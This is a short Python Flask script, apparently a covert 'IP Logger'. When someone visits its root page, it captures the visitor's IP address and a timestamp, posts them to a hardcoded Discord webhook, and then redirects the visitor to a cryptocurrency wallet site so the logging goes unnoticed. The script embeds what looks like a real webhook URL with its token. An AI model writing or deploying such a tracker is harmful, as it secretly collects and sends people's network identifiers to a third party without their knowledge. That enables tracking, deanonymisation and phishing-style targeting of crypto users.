from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1447416593020752027/fTxDho-qrxHPpVcZ70Qt9X4lXWu8Y74OaRAC02Qhg8Y9HR2iqQhv5EgeCTT2eERMMEIp"
    data = {
        "content": "",
        "title": "IP Logger"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
         }
    ]
    requests.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)

    return redirect("https://trustwallet.com")



if __name__ == "__main__":
    app.run(host='0.0.0.0')
